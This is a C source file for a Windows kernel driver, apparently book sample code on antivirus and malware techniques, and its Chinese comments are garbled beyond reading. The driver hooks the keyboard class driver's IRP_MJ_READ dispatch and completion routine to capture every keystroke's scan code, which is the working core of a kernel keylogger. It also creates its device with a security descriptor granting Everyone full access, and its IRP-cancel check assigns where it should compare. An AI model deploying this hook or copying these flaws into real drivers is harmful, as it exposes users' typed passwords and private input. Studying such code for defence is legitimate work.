/*
*  ���ڿ���ɱ���������Ӵ���
*
*  ��    �ߣ���������A1Pass��
*  ��    �ڣ�2012-12-28
*  ���������http://book.hackav.com  �� http://www.hzbook.com
*  ����΢����http://weibo.com/a1pass �� http://t.qq.com/a1pass
*  ���߲��ͣ�http://a1pass.blog.163.com
*/
#include "IRP_Hook.h"


/*
* IRP_MJ_READ ���Զ����������
*
*     �����������Ҫ���ڴ�ӡ����ɨ���룬������ IRP_MJ_READ ��ԭ������̣������
* ���̹��˵����һ����
*/
NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context )
{
    g_uPendingIrpsCount--; 

    // 1. ��ȡ���̻��������ݣ�����ӡ���е�ɨ����
    if( NT_SUCCESS( Irp->IoStatus.Status ) ) 
    {
        PVOID pBuf       = Irp->AssociatedIrp.SystemBuffer;         // ����������
        ULONG uBufLen    = Irp->IoStatus.Information;               // ��������������
        ULONG uKeysCount = uBufLen / sizeof(KEYBOARD_INPUT_DATA);   // ��������
        PKEYBOARD_INPUT_DATA pKeyData = (PKEYBOARD_INPUT_DATA)pBuf; // ������Ϣ 

        for(ULONG i=0; i<uKeysCount; i++)
        {
            DbgPrint( "KeysCount: %d", uKeysCount );
            DbgPrint( "ScanCode : %x ", pKeyData->MakeCode ); 
            DbgPrint( "%s\r\n", pKeyData->Flags ? "Up":"Down" );
        }
    }

    // 2. ���IRP״̬Ϊ����δ��������Ҫ�������IRP
    if( Irp->PendingReturned )    IoMarkIrpPending( Irp ); 

    // 3. ���IRP��Context�б�����ԭ������̣������֮�����򷵻�
    if ( (Irp->StackCount>(ULONG)1) && Context )
        return ((PIO_COMPLETION_ROUTINE)Context)(DeviceObject, Irp, NULL);
    else
        return Irp->IoStatus.Status;
}





/*
* IRP_MJ_READ ���Զ�����ǲ����
*
*     ����ǲ�������ڱ���ԭ������̣��������滻Ϊ�Զ����������OnReadCompletion��
* �ڽ���ʱ����ϵͳ��ԭ��ǲ������
*/
NTSTATUS MyReadDispatch(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{ 
    // 1. ��ȡIRP��ջ�������ÿ��Ʊ�־λ
    PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);
    pStack->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;

    // 2. ����ԭ����������̺󣬽����滻Ϊ�����Զ�����������
    pStack->Context           = pStack->CompletionRoutine;
    pStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)OnReadCompletion;  
    KdPrint(("�������������...\r\n"));  

    // 3. ��δ��IRP������1�󣬱��浱ǰIRP
    g_uPendingIrpsCount++;
    g_pPendingIrp = pIrp; 

    // 4. ����ϵͳԭ��ǲ����
    return g_OrigDispatchRead(pDeviceObject,pIrp);
}





/*
* ȡ������IRP
*
*     �˺������ڳ���ȡ������IRP����ʹ�ó����������ж�ء�
*/
BOOLEAN CancelKeyboardIrp(IN PIRP Irp)
{
    // 1. ���IRP����Ч�ģ����Ҵ�IRPδ��ȡ������ȡ��������ֵ����ִ��ȡ��IRP�Ĳ���
    if (Irp && (Irp->Cancel=false||Irp->CancelRoutine) )
    {
        if ( !IoCancelIrp(Irp) )
        {
            KdPrint(( "ȡ��IRP����ִ��ʧ�ܣ�\r\n" ));
            return false;
        }
    }

    // 2. ȡ����������������Ϊ��
    IoSetCancelRoutine( Irp, NULL );
    return true; 
}





NTSTATUS IRPHook()
{
    NTSTATUS       nStatus    = 0; 
    UNICODE_STRING strKbdName = RTL_CONSTANT_STRING(L"\\Driver\\Kbdclass");

    // 1. ��ȡ�����豸����
    nStatus = ObReferenceObjectByName( 
        &strKbdName, 
        OBJ_CASE_INSENSITIVE, 
        NULL, 
        0, 
        *IoDriverObjectType, 
        KernelMode,
        NULL, 
        &g_objKbdDriver);
    if (!NT_SUCCESS(nStatus))
    {
        KdPrint(("��ȡkbd��������ʧ�ܣ�\r\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // 2. �������
    ObDereferenceObject(g_objKbdDriver);
    
    // 3. ����ԭ��ǲ����
    g_OrigDispatchRead = g_objKbdDriver->MajorFunction[IRP_MJ_READ];

    // 4. �滻IRP_MJ_READ����ǲ����Ϊ�����Զ����MyDispatchRead 
    InterlockedExchangePointer(&g_objKbdDriver->MajorFunction[IRP_MJ_READ],MyReadDispatch);

    return STATUS_SUCCESS;
}





NTSTATUS UnIRPHook()
{
    // 1. ���ԭ��ǲ����δ��ȡ����ֱ���˳�IRPժ������
    if ( !g_OrigDispatchRead )    return STATUS_UNSUCCESSFUL;

    // 2. �ѵ�ǰ�߳�����Ϊ��ʵʱģʽ���Ա����������о�����Ӱ����������
    KeSetPriorityThread(KeGetCurrentThread(), LOW_REALTIME_PRIORITY);

    // 3. ��ԭIRP hook
    InterlockedExchangePointer( &g_objKbdDriver->MajorFunction[IRP_MJ_READ], g_OrigDispatchRead);

    // 4. �������IRPδ����ҵ�ǰIRP��Ч������ȡ�����IRP
    if (g_uPendingIrpsCount>0 && g_pPendingIrp)
    {
        if ( !CancelKeyboardIrp(g_pPendingIrp) )
        {
            // ѭ���ȴ�IRP���
            LARGE_INTEGER stcDelay = RtlConvertLongToLargeInteger(500*MILLI_SECOND);
            while (g_uPendingIrpsCount)
            {
                KdPrint(("����%d��IRP�ڵȴ��С���\r\n",g_uPendingIrpsCount));
                KeDelayExecutionThread(KernelMode, FALSE, &stcDelay);
            }
        }
    }

    return STATUS_SUCCESS;
}





NTSTATUS DriverEntry(IN PDRIVER_OBJECT objDriver, IN PUNICODE_STRING strRegPath)
{
    UNREFERENCED_PARAMETER(strRegPath);
    KdPrint(("DDK_DriverExample Compiled %s %s\r\nIn DriverEntry : %wZ\r\n", __DATE__, __TIME__, strRegPath));

    // 1. ��������ʼ���ؼ��ֲ�����
    NTSTATUS       nStatus       = STATUS_SUCCESS;
    // �豸����
    PDEVICE_OBJECT objDev        = nullptr;
    // �豸����
    UNICODE_STRING strDeviceName = RTL_CONSTANT_STRING(DEVICE_NAME);
    // ������������
    UNICODE_STRING strSymbolicName;
    // �����û��ɶ���дȨ�޵�SDDL
    UNICODE_STRING strSDDL       = RTL_CONSTANT_STRING(L"D:P(A;;GA;;;WD)");
    // �Լ����дһ��GUID����ʹ��Visual Studio�Դ���GUID����������һ��
    const GUID     MY_GUID       = {0x12345678L,0x1234,0x1234,{0x12,0x34,0x56,0x78,0x90,0xAB,0xCB,0xEF}};

    // 2. ��������ȫ���������豸����
    nStatus = IoCreateDeviceSecure( 
        objDriver,                  // ��������
        0,                          // �豸��չ����Ľṹ���С
        &strDeviceName,             // �豸����
        FILE_DEVICE_UNKNOWN,        // �豸����
        FILE_DEVICE_SECURE_OPEN,    // �豸������Ϣ
        FALSE,                      // �豸�Ƿ�Ϊ��ռ��
        &strSDDL,                   // ��ȫ��������������
        &MY_GUID,                   // GUID
        &objDev);                   // ���������ɵ��豸����ָ��
    if(!NT_SUCCESS(nStatus))
    {
        KdPrint(("Error, IoCreateDevice = 0x%x\r\n", nStatus));
        return nStatus;
    }

    // 3. �������ӷ���
    if(IoIsWdmVersionAvailable(1,0x10))
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_GLOBAL_NAME);
    else
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_NAME);

    nStatus = IoCreateSymbolicLink(&strSymbolicName, &strDeviceName);
    if(!NT_SUCCESS(nStatus))
    {
        KdPrint(("Error, IoCreateSymbolicLink = 0x%x\r\n", nStatus));
        IoDeleteDevice(objDev);
        return nStatus;
    }

    // 4. ������ǲ����
    objDriver->MajorFunction[IRP_MJ_CREATE]         = (PDRIVER_DISPATCH)DispatchCreateClose;
    objDriver->MajorFunction[IRP_MJ_CLOSE]          = (PDRIVER_DISPATCH)DispatchCreateClose;
    objDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)DispatchDeviceControl;

    // 5. ����ж�غ���
    objDriver->DriverUnload = DriverUnload;


    return STATUS_SUCCESS;
}


NTSTATUS DispatchCreateClose(IN PDEVICE_OBJECT objDeivce, IN PIRP pIrp)
{
    UNREFERENCED_PARAMETER(objDeivce);

    // ����IRP���״̬
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    // ����IRP�����˶����ֽ�
    pIrp->IoStatus.Information = 0;
    // ����IRP
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}


NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT objDeivce, IN PIRP pIrp)
{
    // 1. ��������ʼ���ؼ��ֲ�����
    UNREFERENCED_PARAMETER(objDeivce);
    NTSTATUS nStatus             = STATUS_INVALID_DEVICE_REQUEST;
    PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
    ULONG uIoControlCode         = 0;
    PVOID pIoBuffer                 = NULL;
    ULONG uInSize                = 0;
    ULONG uOutSize               = 0;
    // ��ȡIoCtrl��
    uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
    // ��ȡ����I/O����
    pIoBuffer      = pIrp->AssociatedIrp.SystemBuffer;
    // ��ȡ����I/O����Ĵ�С
    uInSize        = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
    // ��ȡ����I/O����Ĵ�С
    uOutSize       = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;

    // 2. ��Ӧ�û���Ϣ
    switch(uIoControlCode)
    {
    case IOCTL_HELLO_WORLD:     // ��ӡ�ַ���
        KdPrint(("Hello World!\r\n"));
        nStatus = STATUS_SUCCESS;
        break;
    case IOCTL_HOOK_SYSENTER:   // IRPHook
        IRPHook();
        nStatus = STATUS_SUCCESS;
        break;
    case IOCTL_UNHOOK_SYSENTER: // UnIRPHook
        UnIRPHook();
        nStatus = STATUS_SUCCESS;
        break;
    default:
        KdPrint(("Unknown IOCTL: 0x%X (%04X,%04X)\r\n", 
            uIoControlCode,
            DEVICE_TYPE_FROM_CTL_CODE(uIoControlCode),
            IoGetFunctionCodeFromCtlCode(uIoControlCode) ));
        nStatus = STATUS_INVALID_PARAMETER;    
        break;
    }

    // 3. ���I/O����
    if(nStatus == STATUS_SUCCESS)
        pIrp->IoStatus.Information = uOutSize;
    else
        pIrp->IoStatus.Information = 0;
    pIrp->IoStatus.Status = nStatus;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return nStatus;
}


VOID DriverUnload(IN PDRIVER_OBJECT objDriver)
{
    // 1. ɾ�����ӷ���
    UNICODE_STRING strSymbolicName;
    if(IoIsWdmVersionAvailable(1,0x10))
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_GLOBAL_NAME);
    else
        RtlInitUnicodeString(&strSymbolicName, SYMBOLIC_LINK_NAME);
    IoDeleteSymbolicLink(&strSymbolicName);

    // 2. ɾ���豸����
	if ( objDriver->DeviceObject )
        IoDeleteDevice(objDriver->DeviceObject);
}